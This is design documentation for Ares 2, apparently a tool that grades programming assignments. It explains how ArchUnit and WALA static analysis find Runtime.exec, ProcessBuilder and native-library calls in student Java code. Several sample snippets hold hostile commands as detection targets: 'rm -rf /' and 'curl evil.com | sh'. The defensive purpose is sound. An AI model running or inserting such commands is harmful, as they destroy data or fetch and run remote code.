# Command System Security Mechanism (Architecture Analysis)

## Table of Contents

1. [High-Level Overview](#1-high-level-overview)
   - [1.1 Architecture Analysis Approach](#11-architecture-analysis-approach)
   - [1.2 Configuration Settings](#12-configuration-settings)
   - [1.3 Summary: When Is Command Execution Blocked?](#13-summary-when-is-command-execution-blocked)
   - [1.4 What Code Is Trusted vs. Restricted?](#14-what-code-is-trusted-vs-restricted)
2. [Ares Monitors Command Methods](#2-ares-monitors-command-methods)
   - [2.1 COMMAND SYSTEM - EXECUTE Operations](#21-command-system---execute-operations)
3. [Student Code Triggers Security Check](#3-student-code-triggers-security-check)
4. [Ares Collects Information About the Command Execution](#4-ares-collects-information-about-the-command-execution)
   - [4.1 Loading Java Classes (ArchUnit)](#41-loading-java-classes-archunit)
   - [4.2 Building the Call Graph (WALA)](#42-building-the-call-graph-wala)
5. [Ares Validates the Command Execution](#5-ares-validates-the-command-execution)
   - [5.1 ArchUnit Mode: Static Analysis](#51-archunit-mode-static-analysis)
   - [5.2 WALA Mode: Call Graph Analysis](#52-wala-mode-call-graph-analysis)
   - [5.3 Transitive Access Detection (ArchUnit)](#53-transitive-access-detection-archunit)
   - [5.4 Sink Evaluation and Reverse Reachability (WALA)](#54-sink-evaluation-and-reverse-reachability-wala)
   - [5.5 False Positive Filtering (WALA)](#55-false-positive-filtering-wala)
   - [5.6 Legacy Utilities: ReachabilityChecker and CustomDFSPathFinder](#56-legacy-utilities-reachabilitychecker-and-customdfspathfinder)
6. [Writing Architecture Test Cases](#6-writing-architecture-test-cases)
7. [Conclusion](#7-conclusion)

---

# 1. High-Level Overview

This document describes how Ares 2 prevents unauthorized command execution in student code using **static code analysis** techniques via Architecture Testing frameworks.

**Key Difference from AOP Approach:**
- **AOP (Runtime)**: Monitors command execution during program execution and blocks forbidden commands in real-time
- **Architecture (Static)**: Analyzes compiled bytecode before execution to detect potential command execution violations in the code structure

---

## 1.1 Architecture Analysis Approach

**What is Architecture Testing?**

Architecture testing validates that code follows specific structural rules by analyzing compiled bytecode. Instead of running the code and intercepting command execution calls (AOP), it examines the program structure to find violations.

**Think of it like:**
- **AOP = Security Guard**: Checks command parameters when processes are actually spawned
- **Architecture = Building Inspector**: Reviews code structure before execution to ensure no command execution capabilities exist

**Two Analysis Frameworks:**

### **ArchUnit (Static Analysis)**
- **Type**: Pure static analysis using Archunit framework
- **Strength**: Fast, no call graph needed
- **Method**: Analyzes class dependencies and method calls in compiled bytecode
- **Use Case**: Detecting direct and transitive method access patterns to command execution APIs

### **WALA (Call Graph Analysis)**
- **Type**: Static analysis with call-graph modelling using IBM WALA framework
- **Strength**: Precise call path detection, understands complex call chains
- **Method**: Builds a complete call graph representing all possible method invocations
- **Use Case**: Finding reachable command execution methods through complex call chains

**Validation Flow:**

1. **Load Classes**: Import compiled `.class` files from classpath
2. **Build Analysis Model**: 
   - ArchUnit: Load class metadata and dependencies
   - WALA: Build complete call graph with entry points
3. **Define Rules**: Specify forbidden method patterns (command execution operations)
4. **Execute Analysis**: Check if student code violates rules
5. **Report Violations**: Generate detailed error messages with call paths

---

## 1.2 Configuration Settings

Security policies are configured through settings that instructors can adjust:

| Setting | Type | Description | Example |
|---------|------|-------------|---------|
| **programmingLanguageConfiguration** | `ProgrammingLanguageConfiguration` (enum) | Bakes the architecture mode (`ARCHUNIT` or `WALA`), build tool, and AOP mode into one policy value | `JAVA_USING_MAVEN_ARCHUNIT_AND_ASPECTJ` |
| **allowedClasses** | `ClassPermission[]` | Classes exempt from the method-based architecture rules (including command execution) | `[new ClassPermission("de.example.TrustedHelper")]` |
| **allowedPackages** | `PackagePermission[]` | Packages allowed to be imported (only used by the `PACKAGE_IMPORT` rule) | `[new PackagePermission("java.lang")]` |
| **theSupervisedCodeUsesTheFollowingPackage** | `String` (part of `SupervisedCode`) | Base package of the supervised (student) code | `"de.student"` |

**Notes on the analysis mode and classpath:**
- The architecture mode itself is the enum `ArchitectureMode` with the two constants `ARCHUNIT` and `WALA`. There is no free-standing `architectureMode` policy setting; the mode is derived from `ProgrammingLanguageConfiguration`. The `String` form (`"ARCHUNIT"` / `"WALA"`) only appears as a parameter of `writeArchitectureTestCase(...)` and `executeArchitectureTestCase(...)`.
- There is no `classPath` policy setting either: the classpath to analyse is derived from the build mode (Maven/Gradle), and the supervised scope comes from `SupervisedCode.theSupervisedCodeUsesTheFollowingPackage`.

**Architecture-Specific Configuration:**
- No command-based permissions (no `commandsAllowedToBeExecuted`, etc.) - Architecture testing detects ANY command execution attempt
- No AOP mode selection - Uses the architecture mode instead
- Class-level exemptions (`allowedClasses`) instead of command-level permissions

---

## 1.3 Summary: When Is Command Execution Blocked?

Access is **BLOCKED** 🔴 when **ALL** conditions are true:

1. **Architecture Mode Enabled**: The configuration uses `ArchitectureMode.ARCHUNIT` or `ArchitectureMode.WALA`
2. **Student Code Contains Command Execution Calls**: Analysis detects method calls to command execution APIs
3. **Calls Are Reachable**: The forbidden methods can be reached from student code (directly or transitively)
4. **Not an Allow-Listed Class**: The calling class is not in the `allowedClasses` (`ClassPermission`) allow-list. (`allowedPackages` does NOT exempt command execution; it only feeds the `PACKAGE_IMPORT` rule.)

**If ANY condition fails → No Violation Detected** 🟢

**Key Differences from AOP:**
- 🔴 Detected at analysis time (before execution), not at runtime
- 🔴 Blocks ALL command execution attempts, not just specific commands
- 🔴 Reports potential violations, even if the code path is never executed

**Legend:**
- 🔴 AssertionError thrown → Security violation detected in code structure
- 🟢 No violations found → Code passes architecture analysis

---

## 1.4 What Code Is Trusted vs. Restricted?

**Trusted Code (No Restrictions):**
- Classes on the `allowedClasses` allow-list
- Ares internal code (`de.tum.cit.ase.ares.api.*` is excluded from the ArchUnit import and classified as infrastructure by WALA)
- In WALA mode, infrastructure frames identified by `WalaPathClassification` (`java.`, `javax.`, `sun.`, `jdk.`, `com.sun.`, Ares, Byte Buddy, AspectJ, WALA, ArchUnit, and the configured test-helper prefixes)

**Restricted Code (Subject to Security Checks):**
- ArchUnit mode: every imported class from the analysed classpath except excluded Ares internals, unless the class is allow-listed
- WALA mode: entry-reachable code from the package prefix derived from the analysed classpath, with violations attributed to the nearest non-infrastructure student frame

**Security Assumptions:** 
- Student code is compiled and available as `.class` files
- Class files have not been tampered with after compilation
- Call graph accurately represents possible execution paths (WALA mode)

---

# 2. Ares Monitors Command Methods

Both ArchUnit and WALA modes monitor the same set of command execution methods, loaded from template files:

**Template Locations:**
- **ArchUnit**: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/archunit/methods/command-execution-methods.txt`
- **WALA**: `src/main/resources/de/tum/cit/ase/ares/api/templates/architecture/java/wala/methods/command-execution-methods.txt`

**What is Architecture Testing?**

Instead of intercepting method calls at runtime (AOP approach), architecture testing analyses the compiled bytecode to detect which command execution methods the student code accesses. This happens during the test phase, before the code actually runs.

**Two Analysis Approaches:**
- **ArchUnit**: Fast static analysis of class dependencies
- **WALA**: Precise call graph analysis with false positive filtering

---

## 2.1 COMMAND SYSTEM - EXECUTE Operations

**Monitored Methods (loaded from `command-execution-methods.txt`, 12 entries in each file):**

**java.lang.Runtime:**
- `Runtime.exec(String)`
- `Runtime.exec(String[])`
- `Runtime.exec(String, String[])`
- `Runtime.exec(String[], String[])`
- `Runtime.exec(String, String[], File)`
- `Runtime.exec(String[], String[], File)`
- `Runtime.load(String)`
- `Runtime.loadLibrary(String)`

**java.lang.ProcessBuilder:**
- `ProcessBuilder.<init>(String[])` - Constructor
- `ProcessBuilder.<init>(List)` - Constructor
- `ProcessBuilder.start()`
- `ProcessBuilder.startPipeline` - Static method (listed without parameters, matched by prefix)

**Method Signature Format:**

The two files use different parameter notations. Entries omit return types; blank lines and lines whose first non-whitespace character is `#` are ignored by `FileTools.readMethodsFile`.

*ArchUnit file (source form):*
```
java.lang.Runtime.exec(java.lang.String)
java.lang.ProcessBuilder.<init>(java.lang.String[])
java.lang.ProcessBuilder.start()
```

*WALA file (JVM descriptor parameters, no return type):*
```
java.lang.Runtime.exec(Ljava/lang/String;)
java.lang.ProcessBuilder.<init>([Ljava/lang/String;)
java.lang.ProcessBuilder.start()
```

**Why These Methods?**

These are the **primary APIs** in Java for spawning system processes and loading native code:
- `Runtime.exec()`: Direct command execution through shell
- `Runtime.load()` / `Runtime.loadLibrary()`: Loading native libraries, which can execute arbitrary native code
- `ProcessBuilder`: More flexible process creation with environment control

**Coverage:**
- ✅ All overloaded variants of `Runtime.exec()`
- ✅ Native library loading (`Runtime.load()`, `Runtime.loadLibrary()`)
- ✅ ProcessBuilder constructors (command stored in object)
- ✅ ProcessBuilder.start() and ProcessBuilder.startPipeline() (actual process spawn)

---

# 3. Student Code Triggers Security Check

When student code (any code within the supervised package) attempts to use one of these command execution methods, the architecture analysis will detect it during the test phase.

**Example:**
```java
// Student Code
package de.student.solution;

import java.lang.Runtime;

public class StudentSolution {
    public void maliciousAction() {
        // This will be detected by architecture analysis
        Runtime.getRuntime().exec("rm -rf /");
    }
}
```

**What happens during analysis:**

**ArchUnit Mode:**
1. `ClassFileImporter` loads `StudentSolution.class`
2. Analyzes that `maliciousAction()` method calls `Runtime.exec()`
3. Checks if `Runtime.exec()` is in the forbidden methods list
4. Reports violation: "StudentSolution.maliciousAction accesses Runtime.exec"

**WALA Mode:**
1. Builds call graph from student code entry points
2. Collects all forbidden sinks in the call graph and checks which are reachable from the entry points
3. Reconstructs a witness path: `StudentSolution.maliciousAction → Runtime.exec`
4. Reports violation with source line number

**Key Difference from AOP:**
- This happens during **test time**, not when the code actually runs
- Detects **all potential command execution attempts** in the code structure, even unreachable code
- No runtime overhead, but cannot check specific command parameters

---

# 4. Ares Collects Information About the Command Execution

During architecture analysis, Ares collects information about the code structure to detect command execution patterns.

---

## 4.1 Loading Java Classes (ArchUnit)

**Framework:** TNGs ArchUnit (https://www.archunit.org/)

**Step 1: Import Compiled Classes**

There are two importer variants, depending on where the analysis runs:

*Runtime execution path (`ArchitectureMode.getJavaClasses(classPath)`):*
```java
JavaClasses javaClasses = new ClassFileImporter()
    .withImportOption(location ->
        !location.toString().replace("\\", "/").contains("/de/tum/cit/ase/ares/api/"))  // Exclude Ares internal classes
    .importPath(classPath);  // Import everything on the class path
```

*Generated-code template path (`JavaArchunitTestCase.javaClassesAsCode()`):*
```java
JavaClasses javaClasses = new ClassFileImporter()
    .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
    .withImportOption(location -> {
        String path = location.toString().replace("\\", "/");
        return !path.contains("/de/tum/cit/ase/ares/api/");  // Exclude Ares internal classes
    })
    .importPackages("de.student");  // Import the analysed packages
```

**What happens:**
1. ClassFileImporter scans the classpath (runtime path) or the given packages (generated-code path) for `.class` files
2. Loads class metadata (methods, fields, dependencies)
3. Excludes Ares internal classes (`/de/tum/cit/ase/ares/api/`); the generated-code variant additionally excludes test classes
4. Creates `JavaClasses` object containing all analysed classes

**Analysis Process:**
1. **Import Classes**: Load `.class` files using `ClassFileImporter`
2. **Analyze Dependencies**: Build class dependency graph
3. **Check Access Patterns**: Detect direct and transitive method calls
4. **Report Violations**: Throw `AssertionError` with call chain details

**Strengths:**
- ✅ Fast analysis (no call graph construction)
- ✅ Detects transitive dependencies (A→B→C where C is forbidden)
- ✅ Simple configuration
- ✅ Good error messages with class names

**Limitations:**
- ⚠️ Less precise than WALA for complex call patterns
- ⚠️ May have false positives for conditional code paths
- ⚠️ Cannot determine if code path is actually reachable at runtime

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void maliciousAction() {
        Helper.runSystemCommand();  // Indirect call
    }
}

class Helper {
    void runSystemCommand() {
        Runtime.getRuntime().exec("rm -rf /");  // Forbidden!
    }
}

// ArchUnit detects: StudentCode → Helper.runSystemCommand → Runtime.exec
// Reports: "StudentCode transitively accesses Runtime.exec by [StudentCode.maliciousAction→Helper.runSystemCommand]"
```

---

## 4.2 Building the Call Graph (WALA)

**Framework:** IBM WALA (T.J. Watson Libraries for Analysis)

**How it works:**
```java
// Build call graph
CallGraph cg = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);

// Check the rule against the call graph (throws AssertionError on violation)
JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(cg, allowedClasses);
```

**Analysis Process:**
1. **Create Analysis Scope**: Define which classes to include/exclude
2. **Build Class Hierarchy**: Resolve all type relationships
3. **Construct Call Graph**: Map all possible method call relationships
4. **Find Entry Points**: Identify starting methods in student code
5. **Sink Collection and Reachability**: Collect all forbidden sinks and check which are reachable from the entry points (forward BFS)
6. **Path Classification**: Reconstruct witness paths per sink and filter transitive-JDK false positives

**Strengths:**
- ✅ Very precise call path detection
- ✅ Understands complex call patterns (lambdas, method references)
- ✅ Can filter out transitive JDK-internal calls (false positive reduction)
- ✅ Provides exact call paths with line numbers
- ✅ Models runtime behavior more accurately

**Limitations:**
- ⚠️ Slower analysis (call graph construction is expensive)
- ⚠️ Requires more memory
- ⚠️ More complex configuration (exclusions, entry points)
- ⚠️ May still have false positives for very dynamic code

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void exploit() {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "curl evil.com | sh");
        pb.start();  // Forbidden!
    }
}

// WALA detects: 
// StudentCode.exploit → ProcessBuilder.start
// Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
```

**Special WALA Feature - Infrastructure Frame Classification:**

WALA mode classifies each call-graph frame as either student-authored or infrastructure (JDK / Ares / test framework) via `WalaPathClassification.INFRA_PREFIXES` (e.g. `java.`, `javax.`, `sun.`, `jdk.`, `com.sun.`, `de.tum.cit.ase.ares.api.`, `net.bytebuddy.`, `org.aspectj.`, `com.ibm.wala.`, `com.tngtech.archunit.`). Violations are attributed to the nearest student frame, never to an intermediate JDK method (see [5.5](#55-false-positive-filtering-wala) for the false-positive rules).

---

# 5. Ares Validates the Command Execution

---

## 5.1 ArchUnit Mode: Static Analysis

**How it works:**
```java
// The runtime execution path uses the allow-aware rule
ArchRule rule = JavaArchunitTestCaseCollection.allowAwareRuleFor(
    JavaArchitectureTestCaseSupported.COMMAND_EXECUTION, allowedClasses, allowedPackages);

// Execute rule
rule.check(javaClasses);  // Throws AssertionError if violated
```

**Step 2: Create Architecture Rule**

The rule is built by `createNoClassShouldHaveMethodRule(...)` in `JavaArchunitTestCaseCollection`. The forbidden methods are loaded lazily on the first predicate evaluation, converted with `convertArrayNotation` (Java-style `java.lang.String[]` → JNI-style `[Ljava.lang.String;` as used by ArchUnit's `getFullName()`), and empty entries are filtered out:

```java
private static ArchRule createNoClassShouldHaveMethodRule(String ruleName, Path methodsFilePath,
        Set<ClassPermission> allowedClasses) {
    return ArchRuleDefinition.noClasses().that(isNotAllowedClass(allowedClasses))
            .should(new TransitivelyAccessesMethodsCondition(new DescribedPredicate<>(ruleName) {
                private Set<String> forbiddenMethods;

                @Override
                public boolean test(JavaAccess<?> javaAccess) {
                    if (forbiddenMethods == null) {
                        forbiddenMethods = FileTools.readMethodsFile(FileTools.readFile(methodsFilePath)).stream()
                                .map(JavaArchunitTestCaseCollection::convertArrayNotation)
                                .collect(Collectors.toSet());
                    }
                    return forbiddenMethods.stream().filter(method -> !method.isEmpty())
                            .anyMatch(method -> javaAccess.getTarget().getFullName().startsWith(method));
                }
            })).as(ruleName);
}
```

**Rule Components:**
- **Rule name**: The localised string `"Executes commands"` (message key `security.architecture.execute.command`), applied via `.as(ruleName)`
- **`.that(isNotAllowedClass(allowedClasses))`**: Exempts allow-listed classes; with an empty allow-list the rule applies to every class (this unfiltered form is the static constant `NO_CLASS_MUST_EXECUTE_COMMANDS` used by the generated-template path)
- **DescribedPredicate**: Tests if a method access is forbidden
- **TransitivelyAccessesMethodsCondition**: Finds transitive access paths
- **ArchRule**: Complete rule that can be checked against JavaClasses

**Step 3: Run Architecture Test**

```java
try {
    rule.check(javaClasses);  // Throws AssertionError if violated
} catch (AssertionError e) {
    // Parse error message and throw SecurityException
    JavaArchitectureTestCase.parseErrorMessage(e);
}
```

**When violation is found:**
```
Architecture Violation [Priority: MEDIUM] - Rule 'Executes commands' was violated (1 times):
Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(java.lang.String)> by
  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
```

**Error is converted to** (message key `security.archunit.violation.error`, with the action `"execute a command"` derived from the rule name via `mapRuleNameToAction`):
```java
throw new SecurityException(
    "Ares Security Error (Reason: Student-Code; Stage: Execution): " +
    "de.student.StudentCode.exploit() tried to illegally execute a command " +
    "via java.lang.Runtime.exec(java.lang.String) (called by de.student.StudentCode) " +
    "but was blocked by Ares."
);
```

**Best For:**
- Quick validation during development
- Broad detection of command execution patterns
- When exact call paths are not critical

---

## 5.2 WALA Mode: Call Graph Analysis

**How it works:**

The runtime execution path calls `WalaRule.check(CallGraph, Set<ClassPermission>)` (`WalaRule.java`), which performs the following steps:

```java
public void check(CallGraph cg, Set<ClassPermission> allowedClasses) {
    // 1. Collect every forbidden sink in the call graph (sorted by
    //    signature so the reported violation is deterministic)
    List<CGNode> sinks = ...;
    if (sinks.isEmpty()) {
        return;
    }

    // 2. Forward BFS from the entry points
    Set<CGNode> entryReachable = forwardReachableFromEntrypoints(cg);
    if (entryReachable.isEmpty()) {
        // Fail closed: sinks exist but nothing is reachable, so the
        // analysis was mis-scoped and must not silently pass
        throw new SecurityException(Messages.localized(
            "security.architecture.wala.entrypoints.empty", ruleName));
    }

    // 3. For each reachable sink, reverse-walk towards the entry points
    //    and evaluate every distinct nearest-student approach
    for (CGNode sink : sinks) {
        if (entryReachable.contains(sink)) {
            evaluateSink(cg, sink, allowedClasses, entryReachable);  // throws on genuine violation
        }
    }
}
```

Each reconstructed witness path (entry → ... → forbidden sink) is classified by `WalaPathClassification` (see [5.4](#54-sink-evaluation-and-reverse-reachability-wala) and [5.5](#55-false-positive-filtering-wala)); the first genuine, non-exempt violation throws an `AssertionError`.

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void exploit() {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "curl evil.com | sh");
        pb.start();  // Forbidden!
    }
}

// WALA detects: 
// StudentCode.exploit → ProcessBuilder.start
// Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
```

**Violation Example** (message key `security.architecture.method.call.message`, format `'%s'\n Method <%s> calls method <%s> in (%s.java:%d) accesses <%s>`):
```
'Executes commands'
 Method <de.student.StudentCode.exploit()> calls method <java.lang.ProcessBuilder.start()> in (ProcessBuilder.java:1170) accesses <de.student.StudentCode.exploit()>
```
The placeholders are: rule name, caller signature (nearest student frame), forbidden method signature, declaring class of the sink, source line, and entry-point signature. WALA's JVM-descriptor signatures are converted to source form via `formatJvmSignature` so the resulting `SecurityException` matches the format ArchUnit produces.

**Best For:**
- Precise violation detection
- Understanding exact call paths
- Production-grade security validation
- Reducing false positives

---

## 5.3 Transitive Access Detection (ArchUnit)

**How TransitivelyAccessesMethodsCondition Works:**

```java
public class TransitivelyAccessesMethodsCondition extends ArchCondition<JavaClass> {

    private final TransitiveAccessPath transitiveAccessPath = new TransitiveAccessPath();

    @Override
    public void check(JavaClass clazz, ConditionEvents events) {
        // Get all method accesses from this class
        for (JavaAccess<?> accessInsideClass : clazz.getAccessesFromSelf()) {
            // Find transitive path to a violating (forbidden) method
            List<JavaAccess<?>> path = transitiveAccessPath.findPathFromViolatingMethodTo(accessInsideClass);

            if (!path.isEmpty()) {
                // Report violation with complete call chain
                events.add(newTransitiveAccessPathFoundEvent(accessInsideClass, path));
            }
        }
    }

    private class TransitiveAccessPath {
        List<JavaAccess<?>> findPathFromViolatingMethodTo(JavaAccess<?> access) {
            // Recursive DFS through the access graph, tracking already
            // analysed methods to avoid cycles; the path is built in
            // reverse and then reversed before being returned:
            // [access1 -> access2 -> ... -> forbiddenAccess]
        }
    }
}
```

The violation event is created by `newTransitiveAccessPathFoundEvent(...)`, which builds the "(transitively) accesses <...> by [...]" message and wraps it in `SimpleConditionEvent.satisfied(access, message)`.

**Example Path Detection:**

```
StudentCode.exploit() calls:
  ├─ Helper.runCommand() ✓ (not forbidden, continue searching)
  │   └─ Runtime.exec("rm -rf /") ✗ (FORBIDDEN! Report path)
  └─ System.out.println() ✓ (not forbidden, ignore)

Result: Path found = [StudentCode.exploit → Helper.runCommand → Runtime.exec]
```

---

## 5.4 Sink Evaluation and Reverse Reachability (WALA)

**Step 4: Evaluate Each Forbidden Sink**

Instead of a single forward DFS, `WalaRule` examines every forbidden sink individually (`evaluateSink`):

1. **Reverse walk from the sink** through infrastructure frames only (`WalaPathClassification.isInfraFrame`), using a `Deque`-based worklist over `cg.getPredNodes(...)`.
2. Every time the walk reaches a **non-infrastructure predecessor** (a "nearest-student approach" `[nearestStudentFrame, ...infra..., sink]`), that approach is evaluated immediately (`evaluateApproach`).
3. `evaluateApproach` builds the full witness path by prefixing an entry-to-student path (reverse BFS, `reversePathToEntry`); when the nearest student frame is itself allow-listed, it prefers a prefix routing through a non-allowed student ancestor so a violation cannot hide behind an allow-listed helper.
4. `evaluatePath` classifies the path (see [5.5](#55-false-positive-filtering-wala)) and, for a genuine violation, throws an `AssertionError` with the localised method-call message.
5. A backstop of `MAX_APPROACHES_PER_SINK = 64` bounds the reverse walk per sink; reaching it is logged as a warning, never a silent pass.

**Why per-sink reverse reachability instead of one forward DFS?**

The previous forward DFS (`CustomDFSPathFinder`, see [5.6](#56-legacy-utilities-reachabilitychecker-and-customdfspathfinder)) marked nodes globally visited, so each sink was reported on exactly one path. An allow-listed or false-positive caller discovered first could permanently mask a genuine violation by a different caller of the same sink. Evaluating every distinct nearest-student approach per sink eliminates that masking.

**Fail-Closed Entry Points:**

If forbidden sinks exist but `cg.getEntrypointNodes()` is empty, the analysis was mis-scoped (e.g. the entry-point package prefix did not match the analysed classes). `WalaRule.check` then throws a `SecurityException` (message key `security.architecture.wala.entrypoints.empty`) instead of silently passing.

**Example Reachability Detection:**

```
Entry: StudentCode.exploit()
  ↓ calls
ProcessBuilder.<init>(["rm", "-rf", "/"])
  ↓ calls
ProcessBuilder.start()  ← FORBIDDEN METHOD REACHED!

Path: [StudentCode.exploit, ProcessBuilder.<init>, ProcessBuilder.start]
```

---

## 5.5 False Positive Filtering (WALA)

**Challenge:** Student code may use a permitted JDK API (e.g. `BufferedReader`, `AsynchronousSocketChannel`) whose internal implementation transitively reaches a forbidden method. The student did not intentionally call the forbidden API; it was an internal JDK side-effect.

**Solution:** Per-path classification in `WalaPathClassification`:

```java
// Package prefixes classified as infrastructure (never attributed as student code)
public static final List<String> INFRA_PREFIXES = List.of("java.", "javax.", "sun.", "jdk.", "com.sun.",
        "de.tum.cit.ase.ares.api.", "net.bytebuddy.", "org.aspectj.", "com.ibm.wala.", "com.tngtech.archunit.",
        "anonymous.toolclasses.", "metatest.");

// Subset that indicates a genuine transitive-JDK false positive
// (project test helpers are deliberately omitted)
static final List<String> TRANSITIVE_FALSE_POSITIVE_PREFIXES = List.of("java.", "javax.", "sun.", "jdk.",
        "com.sun.", "de.tum.cit.ase.ares.", "net.bytebuddy.", "org.aspectj.", "com.ibm.wala.",
        "com.tngtech.archunit.");
```

**How a path is classified** (`evaluatePath` in `WalaRule`):
1. `nearestStudentFrame(path)` scans from the sink towards the entry point and returns the first non-infrastructure frame. If the entire path is infrastructure, the path is ignored.
2. `isFalsePositiveTransitivePath(path, studentIdx)` returns `true` when every frame strictly between the nearest student frame and the sink is a transitive-false-positive frame. Such paths are ignored.
3. **Direct violations are never suppressed**: if the student frame is immediately adjacent to the forbidden sink (no intermediate frames), the path is always reported.
4. Allow-listed classes (`ClassPermission`) exempt a path ONLY when every student frame on it is allow-listed; otherwise the violation is attributed to the nearest non-allowed student frame.

**Example Filtering:**

**Path 1 (Ignored - transitive JDK false positive):**
```
StudentCode.readFile()
  ↓
java.io.BufferedReader.readLine()  (infrastructure frame)
  ↓
<forbidden JDK-internal method>

Result: IGNORED (student called a permitted JDK API; the forbidden call is a JDK-internal side-effect)
```

**Path 2 (Detected):**
```
StudentCode.exploit()
  ↓
Runtime.exec("curl evil.com")  (student frame directly adjacent to the sink)

Result: VIOLATION (direct command execution by student, never suppressed)
```

**Note on `Runtime.loadLibrary`:** `Runtime.load` and `Runtime.loadLibrary` are themselves on the forbidden command-execution lists (see [2.1](#21-command-system---execute-operations)). A student calling them directly is a violation; there is no "allowed helper API" list.

---

## 5.6 Legacy Utilities: ReachabilityChecker and CustomDFSPathFinder

The DFS-based path finding in the `wala` package is **legacy and no longer on the production validation path**; validation now runs through `WalaRule.check` as described above. `ReachabilityChecker.findReachableMethods(...)` (which delegates to `CustomDFSPathFinder`) is not called during validation any more. Note that `ReachabilityChecker.getEntryPointsFromStudentSubmission(...)` is still used in production, but only by `CustomCallgraphBuilder` to collect the call-graph entry points.

For historical context, `CustomDFSPathFinder` implements an **iterative** depth-first search (not a recursive one): it keeps the current path on a `Deque` stack, tracks per-node `pendingChildren` iterators, orders successors deterministically via `sortedSuccessors` (sorted by method signature, since WALA's `HashSet`-backed successor order differs between JVM runs), and skips methods listed in the false-positives file `templates/architecture/java/wala/false-positives/false-positives-file.txt`:

```java
public @Nullable List<CGNode> find() {
    if (!initialized) {
        init();  // push first root, record its sorted successors
    }
    while (!stack.isEmpty()) {
        if (P.test(stack.peek())) {           // target filter matched
            List<CGNode> path = new ArrayList<>(stack);
            Collections.reverse(path);
            advance();                         // move forward for next call
            return path;
        }
        advance();                             // push next unvisited child or backtrack
    }
    return null;
}
```

Its global visited-marking (one reported path per sink) is exactly the masking weakness that motivated the per-sink reverse-reachability approach in `WalaRule` (see [5.4](#54-sink-evaluation-and-reverse-reachability-wala)).

---

# 6. Writing Architecture Test Cases

Architecture test cases can be **generated as Java code** for integration into test suites.

**ArchUnit Test Case Generation:**

```java
JavaArchunitTestCase testCase = JavaArchunitTestCase.archunitBuilder()
    .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
    .allowedPackages(Set.of(new PackagePermission("java.lang")))
    .javaClasses(javaClasses)
    .build();

String testCode = testCase.writeArchitectureTestCase("ARCHUNIT", "");
```

**Generated Code** (from the template `archunit/rules/COMMAND_EXECUTION.txt`; `${javaClasses}` is replaced by the `ClassFileImporter` expression shown in [4.1](#41-loading-java-classes-archunit)):
```java
@Test
public void commandSystemShouldNotBeAccessed() {
    javaClasses = new ClassFileImporter()
        .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
        .withImportOption(location -> {
            String path = location.toString().replace("\\", "/");
            return !path.contains("/de/tum/cit/ase/ares/api/");
        })
        .importPackages("de.student");
    JavaArchunitTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(javaClasses);
}
```

**WALA Test Case Generation:**

```java
JavaWalaTestCase testCase = JavaWalaTestCase.walaBuilder()
    .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
    .allowedPackages(Set.of(new PackagePermission("java.lang")))
    .javaClasses(javaClasses)
    .callGraph(callGraph)
    .build();

String testCode = testCase.writeArchitectureTestCase("WALA", "");
```

**Generated Code** (from the template `wala/rules/COMMAND_EXECUTION.txt`; `${callGraph}` is replaced by the call-graph construction expression):
```java
@Test
public void commandSystemShouldNotBeAccessed() {
    callGraph = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);
    JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS.check(callGraph);
}
```

---

# 7. Conclusion

## Summary for Programming Instructors (TL;DR)

**What does Architecture Testing do?**
- ✅ Analyzes **compiled bytecode** to detect forbidden command execution operations
- ✅ Works **before code execution** - catches violations during testing phase
- ✅ Provides **two analysis modes**: Fast (ArchUnit) and Precise (WALA)
- ✅ Detects **transitive calls** - finds violations even through helper methods
- ✅ Generates **clear error messages** with complete call chains

**When do you need this?**
- When you want to prevent students from executing system commands entirely
- For pre-submission checks (CI/CD pipelines)
- When runtime monitoring (AOP) is not feasible or desired
- For comprehensive code structure validation

**How does it work (simplified)?**
1. Compile student code to `.class` files
2. Architecture analysis scans bytecode for command execution method calls
3. If forbidden patterns detected → Report violation with call chain
4. Unlike AOP, this happens during testing, not when code runs

---

## Comparison: Architecture vs. AOP

| Aspect | Architecture (ArchUnit/WALA) | AOP (Byte Buddy/AspectJ) |
|--------|------------------------------|--------------------------|
| **Analysis Time** | Before execution (static) | During execution (runtime) |
| **Detection** | Analyzes code structure | Intercepts method calls |
| **Granularity** | Binary (allowed/forbidden) | Command-based permissions |
| **Performance Impact** | Analysis overhead only | Runtime overhead on every call |
| **False Positives** | Possible (unreachable code) | None (only executed code checked) |
| **Coverage** | All code paths | Only executed paths |
| **Configuration** | Class-level exemptions | Command-level permissions |
| **Use Case** | Pre-submission validation | Runtime security enforcement |
| **Error Timing** | Test phase | Production execution |

---

## Technical Details

### **ArchUnit Mode (Static Analysis)**

**Implementation:**
- Uses ArchUnit's `ArchRule` and custom `TransitivelyAccessesMethodsCondition`
- Analyzes class dependencies and method access patterns
- No call graph construction required

**Violation Example:**
```
Architecture Violation [Priority: MEDIUM] - Rule 'Executes commands' was violated (1 times):
Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(java.lang.String)> by
  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
```

**Best For:**
- Quick validation during development
- Broad detection of command execution patterns
- When exact call paths are not critical

---

### **WALA Mode (Call Graph Analysis)**

**Implementation:**
- Builds complete call graph using IBM WALA framework
- Collects forbidden sinks, checks entry-point reachability (forward BFS), and reverse-walks per sink to attribute violations to the nearest student frame
- Includes per-path false positive classification for transitive JDK internals

